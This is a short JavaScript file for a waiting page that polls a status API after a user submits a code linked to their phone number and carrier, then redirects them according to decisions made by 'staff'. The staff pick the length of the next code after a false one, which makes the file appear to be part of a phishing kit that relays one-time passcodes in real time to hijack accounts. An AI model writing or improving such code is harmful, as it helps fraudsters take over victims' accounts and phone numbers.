/**
 * verify-wait.js — Polling page after user submits a code
 *
 * v2.3 change: retry_code now redirects to validation.html?retry=1 instead of
 * directly to code.html. This way the user waits for staff to select the new
 * code length (waiting_code), then validation.html sends them to code.html with
 * the CORRECT new length — avoiding length mismatches after a false_code.
 */

const API_STATUS = '/api/status';

function getParam(name) {
    return new URL(window.location.href).searchParams.get(name);
}

const phone   = getParam('phone')   || '';
const carrier = getParam('carrier') || '';
const length  = getParam('length')  || '6';

const displayPhone = document.getElementById('displayPhone');
if (displayPhone) displayPhone.textContent = phone;

async function checkStatus() {
    try {
        const res = await fetch(API_STATUS + '?phone=' + encodeURIComponent(phone));
        if (!res.ok) return;
        const data = await res.json();

        if (data.status === 'completed') {
            window.location.href = 'success.html?phone=' + encodeURIComponent(phone);

        } else if (data.status === 'wrong_number') {
            window.location.href = 'index.html?wrong_number=1';

        } else if (data.status === 'retry_code') {
            // v2.3: go back to validation.html so the user waits for staff to
            // pick a new code length before being sent to code.html.
            // carrier is passed through so validation.html can display the operator name.
            const params = new URLSearchParams({ phone, retry: '1' });
            if (carrier) params.set('carrier', carrier);
            window.location.href = 'validation.html?' + params.toString();
        }
        // status === 'code_submitted' → keep polling (still waiting for staff)
    } catch (e) {
        console.error('Polling error:', e);
    }
}

checkStatus();
setInterval(checkStatus, 3000);
